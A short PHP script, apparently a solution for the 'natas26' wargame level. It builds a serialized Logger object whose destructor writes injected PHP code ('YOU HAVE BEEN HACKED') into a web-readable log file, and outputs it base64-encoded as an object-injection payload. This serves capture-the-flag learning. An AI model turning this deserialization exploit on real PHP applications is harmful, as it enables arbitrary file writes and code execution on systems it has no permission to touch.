<?php

class Logger{
    public $logFile;
    public $initMsg;
    public $exitMsg;
      
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
      
        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
      
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
      
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$payload = new Logger("temp.txt");
$payload->logFile = "./logfile.txt";
$payload->exitMsg = "<?php echo \"YOU HAVE BEEN HACKED\" ?>";
echo "!!!\n".base64_encode(serialize($payload))."\n!!!\n";
